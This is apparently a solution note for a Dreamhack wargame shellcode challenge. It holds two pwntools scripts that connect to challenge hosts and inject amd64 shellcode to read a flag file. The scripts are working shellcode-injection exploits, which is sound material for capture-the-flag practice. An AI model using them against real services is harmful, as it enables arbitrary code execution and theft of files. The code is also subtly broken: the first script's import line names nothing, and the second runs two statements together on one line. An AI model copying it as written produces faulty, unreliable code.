https://dreamhack.io/wargame/challenges/410

# solve : shellcraft
```python
from pwn import

p = remote('host2.dreamhack.games', 18670)
context.arch = 'amd64'
r = "/home/shell_basic/flag_name_is_loooooong"

shellcode = ''
shellcode += shellcraft.open(r)
shellcode += shellcraft.read('rax', 'rsp', 0x100)
shellcode += shellcraft.write(1, 'rsp', 0x100)

p.recvuntil("shellcode: ") 
p.sendline(asm(shellcode))

print(p.recv())
```

# solve : shellcraft2
```python
from pwn import * 

r = remote("host3.dreamhack.games", 16087)
context.arch = "amd64" r.recvuntil(b"shellcode: ")

filedirect = "/home/shell_basic/flag_name_is_loooooong" 
shellcode = shellcraft.linux.cat(filedirect) 

r.send(asm(shellcode)) 
r.interactive()
```